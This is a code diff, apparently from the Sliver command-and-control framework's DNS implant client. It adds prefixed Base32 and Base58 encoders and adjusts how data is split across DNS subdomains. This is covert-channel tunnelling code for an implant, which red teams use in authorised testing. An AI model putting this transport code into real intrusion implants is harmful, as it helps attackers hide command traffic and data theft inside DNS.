@@ -162,6 +162,60 @@ func DNSStartSession(parent string, opts *DNSOptions) (*SliverDNSClient, error) 
 	return client, nil
 }
 
+type DNSBase32Encoder struct{}
+
+const alpha = "abcdefghijklmnopqrstuvwxyz"
+
+// Encode - Base32 Encode
+func (e DNSBase32Encoder) Encode(data []byte) ([]byte, error) {
+	encodedData, err := encoders.Base32.Encode(data)
+	if err != nil {
+		return nil, err
+	}
+
+	index := insecureRand.Intn(len(alpha))
+	if index&1 == 1 {
+		index = index - 1
+	}
+	prefix := alpha[index]
+	return append([]byte{prefix}, encodedData...), nil
+}
+
+// Decode - Base32 Decode
+func (e DNSBase32Encoder) Decode(data []byte) ([]byte, error) {
+	if len(data) < 1 {
+		return nil, errors.New("invalid data")
+	}
+	return encoders.Base32.Decode(data[1:])
+}
+
+type DNSBase58Encoder struct{}
+
+// Encode - Base58 Encode
+func (e DNSBase58Encoder) Encode(data []byte) ([]byte, error) {
+	encodedData, err := encoders.Base58.Encode(data)
+	if err != nil {
+		return nil, err
+	}
+	index := insecureRand.Intn(len(alpha))
+	if index&1 != 1 {
+		index = index + 1
+		if len(alpha) <= index {
+			index = index - 2
+		}
+	}
+	prefix := alpha[index]
+	return append([]byte{prefix}, encodedData...), nil
+}
+
+// Decode - Base58 Decode
+func (e DNSBase58Encoder) Decode(data []byte) ([]byte, error) {
+	if len(data) < 1 {
+		return nil, errors.New("invalid data")
+	}
+	return encoders.Base58.Decode(data[1:])
+}
+
 // NewDNSClient - Initialize a new DNS client, generally you should use DNSStartSession
 // instead of this function, this is exported mostly for unit testing
 func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
@@ -179,9 +233,10 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 		closed:          true,
 
 		WorkersPerResolver: opts.WorkersPerResolver,
-		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
-		base32:             encoders.Base32Encoder{},
-		base58:             encoders.Base58Encoder{},
+		//                  parent domain       data                   encoder
+		subdataSpace: 254 - len(parent) - (1 + (254-len(parent))/64) - 1,
+		base32:       DNSBase32Encoder{},
+		base58:       DNSBase58Encoder{},
 	}
 }
 
@@ -210,8 +265,8 @@ type SliverDNSClient struct {
 	workerPool         []*DNSWorker
 	WorkersPerResolver int
 
-	base32 encoders.Base32Encoder
-	base58 encoders.Base58Encoder
+	base32 DNSBase32Encoder
+	base58 DNSBase58Encoder
 
 	enableCaseSensitiveEncoder bool
 }
@@ -740,13 +795,13 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			stop = len(data) - 1 // make sure the loop is executed at least once
 		}
 
-		// Sometimes adding a byte will result in +2 chars so we -1 the subdata space
+		// Sometimes adding a byte will result in +2 chars so we -2 the subdata space
 		encoded = ""
 		// {{if .Config.Debug}}
 		//log.Printf("[dns] encoded: %d, subdata space: %d | stop: %d, len: %d",
-		//	len(encoded), (s.subdataSpace - 1), stop, len(data))
+		//	len(encoded), (s.subdataSpace - 2), stop, len(data))
 		// {{end}}
-		for len(encoded) < (s.subdataSpace-1) && stop < len(data) {
+		for len(encoded) < (s.subdataSpace-2) && stop < len(data) {
 			stop++
 			// {{if .Config.Debug}}
 			// log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
